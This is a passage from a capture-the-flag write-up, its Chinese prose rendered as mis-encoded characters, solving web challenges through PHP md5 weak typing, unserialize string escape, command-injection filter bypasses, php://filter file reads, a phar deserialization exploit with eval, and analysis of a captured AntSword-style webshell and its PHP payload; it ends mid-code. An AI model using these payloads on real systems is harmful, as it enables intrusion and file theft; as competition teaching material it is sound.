åŒ¹é…åˆ°ï¼Œæ¢è¡Œç¬¦ç»•è¿‡æ­£åˆ™åŒ¹é…ã€‚</li><li>ä¼ å…¥ <code>str1</code>å’Œ <code>str2 </code>çš„ <code>md5 </code>å€¼ä¸å¯ä»¥ä¸€æ ·,ä½†æ˜¯ç»è¿‡<code>strtr</code>å‡½æ•°æ›¿æ¢åçš„<code>md5</code>å€¼è¦ä¸€æ ·</li><li>ååºåˆ—åŒ–é•¿åº¦é€ƒé€¸ï¼ŒæŠŠå­—ç¬¦ä¸²çš„ <code>x</code> éƒ½æ›¿æ¢æˆ <code>yy</code></li></ol><p>ç¬¬ä¸€å…³ä½¿ç”¨ <code>num=23333%0a</code> å³å¯ç»•è¿‡</p><p>ç¬¬äºŒå…³çš„ <code>str1</code> è¦æ˜¯æ•°å­—ï¼Œ<code>str2</code> éšä¾¿ç”¨ä¸€ä¸ª md5 åæ˜¯ 0e å¼€å¤´ä¸”ä¸ºçº¯æ•°å­—çš„å³å¯ã€‚<code>str1</code> éœ€è¦ md5 åä»¥ 0e å¼€å¤´ï¼Œåé¢åªåŒ…å« <code>pggnb</code> ä¸­ä¸€ä¸ªæˆ–å¤šä¸ªçš„å­—æ¯ï¼Œå…¶ä½™æ˜¯æ•°å­—ï¼Œè¿™æ ·ä¸€æ›¿æ¢å°±éƒ½æ˜¯ 0e é€ æˆ php å¼±ç±»å‹çš„ç»•è¿‡ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">import</span> requests<br><br><span class="hljs-comment"># 11230178</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">md5</span>():<br><span class="hljs-keyword">global</span> dict_az<br>dict_az = <span class="hljs-string">&#x27;abcdefghijklmnopqrstuvwxyz&#x27;</span><br>i = <span class="hljs-number">0</span><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>result = <span class="hljs-string">&#x27;&#x27;</span><br>result += <span class="hljs-built_in">str</span>(i)<br>i = i + <span class="hljs-number">1</span><br>hashed_s = hashlib.md5(result.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)).hexdigest()<br>r = re.<span class="hljs-keyword">match</span>(<span class="hljs-string">&#x27;^0e[0-9pggnb]&#123;30&#125;&#x27;</span>, hashed_s)<br><span class="hljs-keyword">if</span> r:<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] found! md5( &#123;&#125; ) ---&gt; &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(result, hashed_s))<br>exit(<span class="hljs-number">0</span>)<br><br><span class="hljs-keyword">if</span> i % <span class="hljs-number">1000000</span> == <span class="hljs-number">0</span>:<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] current value: &#123;&#125;       &#123;&#125; iterations, continue...&quot;</span>.<span class="hljs-built_in">format</span>(result, <span class="hljs-built_in">str</span>(i)))<br></code></pre></td></tr></table></figure><p>è·‘å‡ºæ¥ <code>11230178</code> å³å¯æˆç«‹ï¼Œmd5 å€¼ä¸º <code>0e732639146814822596b49bb6939b97</code>ï¼Œæ›¿æ¢åå°±ä¸ºçº¯æ•°å­—äº†ï¼Œç¬¬äºŒå…³è¿‡ã€‚</p><p>ç¬¬ä¸‰å…³å°±æ˜¯ php ååºåˆ—åŒ–é•¿åº¦å˜åŒ–å°¾éƒ¨å­—ç¬¦ä¸²é€ƒé€¸ï¼Œå¯ä»¥å‚è€ƒ 0ctf2016 çš„ piapiapiaï¼Œé¢˜ç›®å°†ä¼ å…¥çš„ <code>username</code> å’Œ  å˜é‡<code>password</code>æ‰“åŒ…æˆä¸€ä¸ªæ•°ç»„ç„¶ååºåˆ—åŒ–ï¼Œå¦‚æœååºåˆ—åŒ–å‡ºæ¥æ•°ç»„ç¬¬äºŒä¸ªå…ƒç´ ç­‰äº 123456ï¼Œå³å¯å¾—åˆ°flagã€‚å› æ­¤æˆ‘ä»¬éœ€è¦æ„é€  <code>a:2:&#123;i:0;s:5:&quot;admin&quot;;i:1;s:6:&quot;123456&quot;;&#125;&quot;;i:1;s:5:&quot;aaaaa&quot;;&#125;</code> æ¥å°†å­—ç¬¦ä¸²é—­åˆæ§åˆ¶ç¬¬äºŒä¸ªå…ƒç´ ä¸ºæˆ‘ä»¬çš„ 123456ï¼Œä½†æ˜¯é•¿åº¦ä¼šå˜ï¼Œæˆ‘ä»¬è¦æ·»åŠ çš„å­—ç¬¦ä¸²ä¸º <code>admin&quot;;i:1;s:6:&quot;123456&quot;;&#125;</code>ï¼Œé•¿åº¦ä¸º20ï¼Œå› æ­¤æˆ‘ä»¬æ„é€ 20ä¸ªxï¼Œ<code>xxxxxxxxxxxxxxxxxxxx&quot;;i:1;s:6:&quot;123456&quot;;&#125;</code>ï¼Œè¿™æ ·xå°±ä¼šè¢«æ›¿æ¢æˆyyï¼Œæˆ‘ä»¬å°±å¤šäº†20ä¸ªä½ç½®ï¼ŒæŠŠæˆ‘ä»¬çš„ payload æŒ¤å‡ºå»ï¼Œå°±åˆšå¥½å¯ä»¥é—­åˆäº†ã€‚</p><p>å®Œæ•´ payload: </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">url = <span class="hljs-string">&#x27;http://218.197.154.9:10015/?num=23333%0a&amp;str1=0e215962017&amp;str2=11230178&#x27;</span><br>un = <span class="hljs-string">&#x27;xxxxxxxxxxxxxxxxxxxx&quot;;i:1;s:6:&quot;123456&quot;;&#125;&#x27;</span><br>data = &#123;<br><span class="hljs-string">&quot;username&quot;</span>: un<br>&#125;<br><span class="hljs-comment"># whuctf&#123;f4f9b4cd-e80e-4570-9b82-013d257c0756&#125;</span><br></code></pre></td></tr></table></figure><h1 id="ezcmd"><a href="#ezcmd" class="headerlink" title="ezcmd"></a>ezcmd</h1><p>è¿™é“é¢˜ä¹Ÿæ˜¯ä¸€ä¸ªåŸé¢˜ï¼ŒGXYCTF2019 çš„ Ping Ping Pingï¼Œæºç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ip&#x27;</span>]))&#123;<br>  <span class="hljs-variable">$ip</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ip&#x27;</span>];<br>  <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\&amp;|\/|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;1f&#125;]|\&gt;|\&#x27;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;/&quot;</span>, <span class="hljs-variable">$ip</span>, <span class="hljs-variable">$match</span>))&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\&amp;|\/|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;20&#125;]|\&gt;|\&#x27;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;/&quot;</span>, <span class="hljs-variable">$ip</span>, <span class="hljs-variable">$match</span>);<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;fxck your symbol!&quot;</span>);<br>  &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/ /&quot;</span>, <span class="hljs-variable">$ip</span>))&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;no space!&quot;</span>);<br>  &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/.*f.*l.*a.*g.*/&quot;</span>, <span class="hljs-variable">$ip</span>))&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;no flag&quot;</span>);<br>  &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/tac|rm|echo|cat|nl|less|more|tail|head/&quot;</span>, <span class="hljs-variable">$ip</span>))&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;cat&#x27;t read flag&quot;</span>);<br>  &#125;<br>  <span class="hljs-variable">$a</span> = <span class="hljs-title function_ invoke__">shell_exec</span>(<span class="hljs-string">&quot;ping -c 4 &quot;</span>.<span class="hljs-variable">$ip</span>); <br>  <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;pre&gt;&quot;</span>;<br>  <span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-variable">$a</span>);<br>&#125;<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>è¿‡æ»¤äº† <code>&#123;</code>ï¼Œ<code>&#125;</code> ï¼Œæ²¡æœ‰è¿‡æ»¤ <code>$</code>ï¼Œç©ºæ ¼å¯ä»¥ä½¿ç”¨ <code>$IFS$9</code> ç»•è¿‡ï¼Œç®¡é“ç¬¦è¢«è¿‡æ»¤äº†ï¼Œä½†æ˜¯å¯ä»¥ç”¨ <code>;</code> è¿›è¡Œå¦ä¸€æ¡å‘½ä»¤çš„æ‰§è¡Œï¼Œé¦–å…ˆ <code>?ip=;ls</code> å°±å¯ä»¥çœ‹åˆ° flag å°±åœ¨ <code>flag.php</code></p><p><img src="https://img.tucang.cc/api/image/show/05f7980b6ab6816045465c1067477498" alt="image-20200527210656915"></p><p>ç„¶åè¿‡æ»¤äº†è¯»çš„å‘½ä»¤å…³é”®å­—ï¼Œè¿™é‡Œç”¨ <code>ca\t</code> å³å¯ç»•è¿‡ï¼ŒåŒæ—¶ä¹Ÿè¿‡æ»¤äº† <code>flag.php</code> çš„å…³é”®å­—ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨æ‹¼æ¥çš„æ–¹æ³•æ¥ç»•è¿‡:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">?ip=;a=fl;b=ag;ca\t<span class="hljs-variable">$IFS</span><span class="hljs-variable">$9</span><span class="hljs-variable">$a</span><span class="hljs-variable">$b</span>.php <span class="hljs-regexp">//</span>ä½†è¿˜æ˜¯ä¼šè¢«æ£€æµ‹å‡ºæ¥ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥æ¢ä¸€ä¸‹é¡ºåºæˆ–è€…æ¢æˆéƒ¨åˆ†<br>?ip=;a=ag;b=fl;ca\t<span class="hljs-variable">$IFS</span><span class="hljs-variable">$1</span><span class="hljs-variable">$b</span><span class="hljs-variable">$a</span>.php<br>?ip=;a=lag;ca\t<span class="hljs-variable">$IFS</span><span class="hljs-variable">$9f</span><span class="hljs-variable">$a</span>.php<br></code></pre></td></tr></table></figure><p>å®Œæ•´ payloadï¼š<code>?ip=;a=lag;ca\t$IFS$9f$a.php</code></p><h1 id="ezinclude"><a href="#ezinclude" class="headerlink" title="ezinclude"></a>ezinclude</h1><p>è¿™é“é¢˜æœ‰ç‚¹è„‘æ´ï¼Œåœ¨ <code>/contact.php</code> é‡Œæœ‰æäº¤è¡¨å•çš„é€‰é¡¹ï¼Œéšä¾¿æäº¤å‘ç° url ä¸Šæœ‰ä¸€äº›å‚æ•°ï¼Œé¢˜ç›®è¯´æ˜¯æ–‡ä»¶åŒ…å«ï¼Œé‚£ä¹ˆå¾€è¿™æ–¹é¢å»æƒ³ï¼Œåæ¥å‘ç°ç›´æ¥åŠ ä¸€ä¸ª <code>file</code> å‚æ•°å°±å¯ä»¥è¯»äº†ï¼Œflagå°±å‡ºæ¥äº†ï¼Œå¯èƒ½æ˜¯ç»™æ–°ç”Ÿçš„é€åˆ†é¢˜å§ã€‚</p><p>å®Œæ•´ payload: <code>/thankyou.php?firstname=&amp;lastname=&amp;country=australia&amp;subject=&amp;file=php://filter/convert.base64-encode/resource=flag.php</code></p><h1 id="Easy-unserialize"><a href="#Easy-unserialize" class="headerlink" title="Easy_unserialize"></a>Easy_unserialize</h1><p>è¿™é¢˜è€ƒå¯Ÿçš„æ˜¯ä¸Šä¼  phar è§¦å‘ååºåˆ—åŒ–ï¼Œåˆšå¥½è¡¥äº†ä¸€ä¸‹æˆ‘çš„å‘ã€‚ã€‚å¯ä»¥å‚è€ƒåˆ›å®‡çš„ paper: <code>https://paper.seebug.org/680/</code></p><p>è¿˜æ˜¯å­¦å¼Ÿå‘ç°åœ¨ä¸»é¡µåŠ å‚æ•° <code>?acti0n=php://filter/convert.Base64-encode/resource=upload.php</code> å¯ä»¥è¯»åˆ°æºç ï¼Œäºæ˜¯æŠŠ <code>view.php</code> å’Œ <code>upload.php</code> çš„æºç çœ‹äº†ä¸€ä¸‹ï¼Œ <code>upload</code> çš„æºç å¥½åƒæ²¡æœ‰ä»€ä¹ˆåˆ©ç”¨çš„ç‚¹ï¼Œçœ‹åˆ° <code>view.php</code> çš„æ—¶å€™ï¼Œå‘ç°äº†ä¸€ä¸ª <code>phar</code> çš„å±é™©å‡½æ•°ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">delete_img</span>(<span class="hljs-params"><span class="hljs-variable">$file_name</span></span>) </span>&#123;<br> <span class="hljs-variable">$name</span> = <span class="hljs-variable">$file_name</span>;<br> <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$name</span>)) &#123;<br> @<span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$name</span>);<br> <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$name</span>)) &#123;<br> <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;p align=\&quot;center\&quot; style=\&quot;font-weight: bold;\&quot;&gt;æˆåŠŸåˆ é™¤! 3såè·³è½¬&lt;/p&gt;&quot;</span>;<br> <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;refresh:3;url=view.php&quot;</span>);<br> &#125; <span class="hljs-keyword">else</span> &#123;<br> <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Can not delete!&quot;</span>;<br> <span class="hljs-keyword">exit</span>;<br> &#125;<br> &#125; <span class="hljs-keyword">else</span> &#123;<br> <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;p align=\&quot;center\&quot; style=\&quot;font-weight: bold;\&quot;&gt;æ‰¾ä¸åˆ°è¿™ä¸ªæ–‡ä»¶! &lt;/p&gt;&quot;</span>;<br> &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™é‡Œæœ‰ä¸€ä¸ª <code>file_exists</code> å¯ä»¥åˆ©ç”¨ï¼Œè€Œä¸”æœ€åè¿˜ä¼šè¿›è¡Œä»£ç æ‰§è¡Œã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br> <span class="hljs-keyword">eval</span>(<span class="hljs-variable language_">$this</span>-&gt;cmd);<br>&#125;<br></code></pre></td></tr></table></figure><p>è™½ç„¶ <code>upload.php</code> æ²¡æœ‰ä»€ä¹ˆåˆ©ç”¨ç‚¹ï¼Œä½†æ˜¯å¯ä»¥çœ‹åˆ°é»‘åå•</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/(scandir)|(end)|(implode)|(eval)|(system)|(passthru)|(exec)|(chroot)|(chgrp)|(chown)|(shell_exec)|(proc_open)|(proc_get_status)|(ini_alter)|(ini_set)|(ini_restore)|(dl)|(pfsockopen)|(symlink)|(popen)|(putenv)|(syslog)|(readlink)|(stream_socket_server)|(error_log)/i&#x27;</span>, <span class="hljs-variable">$content</span>)<br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬å¯ä»¥ç”¨ <code>show_source()</code> å‡½æ•°æŠŠ <code>flag.php</code> è¯»ä¸€ä¸‹ï¼Œè€Œä¸” <code>phar</code> å¯ä»¥ç›´æ¥ä¸Šä¼ ï¼Œé‚£æˆ‘ä»¬å…ˆæ„é€ ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">View</span></span><br><span class="hljs-class">    </span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$dir</span>;<br>        <span class="hljs-keyword">private</span> <span class="hljs-variable">$cmd</span>;<br><br>        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;cmd = <span class="hljs-string">&#x27;show_source(&quot;flag.php&quot;);&#x27;</span>;<br>        &#125;<br>        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>            <span class="hljs-keyword">eval</span>(<span class="hljs-variable language_">$this</span>-&gt;cmd);<br>        &#125;<br>    &#125;<br>    <span class="hljs-variable">$phar</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Phar</span>(<span class="hljs-string">&#x27;phar.phar&#x27;</span>);<br>    <span class="hljs-variable">$phar</span> -&gt; <span class="hljs-title function_ invoke__">startBuffering</span>();<br>    <span class="hljs-variable">$phar</span> -&gt; <span class="hljs-title function_ invoke__">setStub</span>(<span class="hljs-string">&#x27;GIF89a&#x27;</span>.<span class="hljs-string">&#x27;&lt;?php __HALT_COMPILER();?&gt;&#x27;</span>);   <span class="hljs-comment">//è®¾ç½®stubï¼Œå¢åŠ gifæ–‡ä»¶å¤´</span><br>    <span class="hljs-variable">$phar</span> -&gt;<span class="hljs-title function_ invoke__">addFromString</span>(<span class="hljs-string">&#x27;test.txt&#x27;</span>,<span class="hljs-string">&#x27;test&#x27;</span>);  <span class="hljs-comment">//æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶</span><br>    <span class="hljs-variable">$object</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">View</span>();<br>    <span class="hljs-variable">$phar</span> -&gt; <span class="hljs-title function_ invoke__">setMetadata</span>(<span class="hljs-variable">$object</span>);  <span class="hljs-comment">//å°†è‡ªå®šä¹‰meta-dataå­˜å…¥manifest</span><br>    <span class="hljs-variable">$phar</span> -&gt; <span class="hljs-title function_ invoke__">stopBuffering</span>();<br>    <br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>exp çš„æ¨¡æ¿ï¼Œæœ‰æ—¶å€™é™åˆ¶ gif çš„è¯å¯ä»¥å¢åŠ  <code>gif</code> å¤´ï¼Œç”Ÿæˆ <code>phar</code> æ–‡ä»¶åï¼Œç›´æ¥ä¸Šä¼ ã€‚</p><p><img src="https://img.tucang.cc/api/image/show/4a5affb4024b2251fd9864cca871e39a" alt="image-20200527212700287"></p><p>æˆ‘ä»¬å¯ä»¥çŸ¥é“ï¼Œè¦é€šè¿‡ <code>delete</code> è¿™ä¸ªå‚æ•°æ¥è§¦å‘ <code>file_exists</code> æ‰å¯ä»¥åˆ©ç”¨ <code>phar</code>ï¼Œå› æ­¤æ„é€ å‚æ•° <code>detele=phar://phar.phar</code>åŒ…å«ä¸€ä¸‹ï¼Œå°±å¯ä»¥å¾—åˆ°flagäº†ã€‚</p><p><code>WHUCTF&#123;Phar_1s_Very_d@nger0u5&#125;</code></p><h1 id="shellofAWD"><a href="#shellofAWD" class="headerlink" title="shellofAWD"></a>shellofAWD</h1><p>è¿™é¢˜æ˜¯ä¸€ä¸ªæµé‡åŒ…ï¼Œå¬åå­—åº”è¯¥æ˜¯åœ¨æ‰“ AD æ—¶çš„æµé‡åŒ…ï¼Œæ‰“å¼€æµé‡åŒ…å¾ˆå¿«å°±å¯ä»¥å‘ç°ğŸï¼Œå¹¶ä¸”è¿˜å¯ä»¥çœ‹åˆ°é¶æœºçš„ ipï¼Œç­›é€‰ä¸€ä¸‹è¿›è¡Œåˆ†æã€‚</p><p><img src="https://img.tucang.cc/api/image/show/89625b98c3cbfa060fa3a34924ea999f" alt="image-20200527213132020"></p><p>åæ¥è·Ÿè¸ªä¸‹ä¸€ä¸ª tcp æµï¼Œå‘ç°é€äº†ä¸€å †å‚æ•°</p><p><img src="https://img.tucang.cc/api/image/show/8b08a2fa415c0b1354f6aa29254e8bcd" alt="image-20200527213230184"></p><p>base64è§£ç antå‚æ•°å¾—åˆ°</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-built_in">eval</span>(base64_decode($_POST[_0x6aa401ad3c537]));<span class="hljs-built_in">die</span>();<br></code></pre></td></tr></table></figure><p>å†çœ‹çœ‹ <code>_0x6aa401ad3c537</code> çš„å‚æ•°ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>@<span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&quot;display_errors&quot;</span>, <span class="hljs-string">&quot;0&quot;</span>);<br>@<span class="hljs-title function_ invoke__">set_time_limit</span>(<span class="hljs-number">0</span>);<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">asenc</span>(<span class="hljs-params"><span class="hljs-variable">$out</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$out</span>;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">asoutput</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-variable">$output</span> = <span class="hljs-title function_ invoke__">ob_get_contents</span>();<br>    <span class="hljs-title function_ invoke__">ob_end_clean</span>();<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;2e0ebea5592&quot;</span>;<br>    <span class="hljs-keyword">echo</span> @<span class="hljs-title function_ invoke__">asenc</span>(<span class="hljs-variable">$output</span>);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;62e800a0&quot;</span>;<br>&#125;<br><span class="hljs-title function_ invoke__">ob_start</span>();<br><span class="hljs-keyword">try</span> &#123;<br>    <span class="hljs-variable">$D</span> = <span class="hljs-title function_ invoke__">dirname</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&quot;SCRIPT_FILENAME&quot;</span>]);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$D</span> == <span class="hljs-string">&quot;&quot;</span>) &#123;<br>        <span class="hljs-variable">$D</span> = <span class="hljs-title function_ invoke__">dirname</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&quot;PATH_TRANSLATED&quot;</span>]);<br>    &#125;<br>    <span class="hljs-variable">$R</span> = <span class="hljs-string">&quot;<span class="hljs-subst">&#123;$D&#125;</span>\t&quot;</span>;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$D</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>) != <span class="hljs-string">&quot;/&quot;</span>) &#123;<br>        <span class="hljs-keyword">foreach</span> (<span class="hljs-title function_ invoke__">range</span>(<span class="hljs-string">&quot;C&quot;</span>, <span class="hljs-string">&quot;Z&quot;</span>) <span class="hljs-keyword">as</span> <span class="hljs-variable">$L</span>) &#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">is_dir</span>(<span class="hljs-string">&quot;<span class="hljs-subst">&#123;$L&#125;</span>:&quot;</span>)) &#123;<br>                <span class="hljs-variable">$R</span> .= <span class="hljs-string">&quot;<span class="hljs-subst">&#123;$L&#125;</span>:&quot;</span>;<br>            &#125;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$R</span> .= <span class="hljs-string">&quot;/&quot;</span>;<br>    &#125;<br>    <span class="hljs-variable">$R</span> .= <span class="hljs-string">&quot;\t&quot;</span>;<br>    <span class="hljs-variable">$u</span> = <span class="hljs-title function_ invoke__">function_exists</span>(<span class="hljs-string">&quot;posix_getegid&quot;</span>) ? @<span class="hljs-title function_ invoke__">posix_getpwuid</span>(@<span class="hljs-title function_ invoke__">posix_geteuid</span>()) : <span class="hljs-string">&quot;&quot;</span>;<br>    <span class="hljs-variable">$s</span> = <span class="hljs-variable">$u</span> ? <span class="hljs-variable">$u</span>[<span class="hljs-string">&quot;name&quot;</span>] : @<span class="hljs-title function_ invoke__">get_current_user</span>();<br>    <span class="hljs-variable">$R</span> .= <span class="hljs-title function_ invoke__">php_uname</span>();<br>    <span class="hljs-variable">$R</span> .= <span class="hljs-string">&quot;\t<span class="hljs-subst">&#123;$s&#125;</span>&quot;</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$R</span>;<br>&#125; <span class="hljs-keyword">catch</span> (<span class="hljs-built_in">Exception</span> <span class="hljs-variable">$e</span>) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;ERROR://&quot;</span> . <span class="hljs-variable">$e</span>-&gt;<span class="hljs-title function_ invoke__">getMessage</span>();<br>&#125;<br><span class="hljs-title function_ invoke__">asoutput</span>();<br><span class="hljs-keyword">die</span>;<br></code></pre></td></tr></table></figure><p>å½“ç„¶ï¼Œå¯ä»¥çœ‹åˆ°å…¶å®å¹¶æ²¡æœ‰ä»€ä¹ˆç”¨ï¼Œå¯èƒ½å°±æµ‹è¯•ä¸€ä¸‹åŠŸèƒ½ï¼Œä¸è¿‡å¤§æ¦‚çŸ¥é“äº†ä»–ä¼ ä¸œè¥¿çš„å¥—è·¯äº†ï¼Œçœ‹åˆ° <code>tcp.stream eq 3</code> æ—¶ï¼Œå‘ç°äº†</p><p><img src="https://img.tucang.cc/api/image/show/ba566ba0b1f09819682dbc13787fb2dd" alt="image-20200527213650249"></p><p>æ‹¿åˆ°äº†æ¯”è¾ƒå…³é”®çš„ä»£ç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 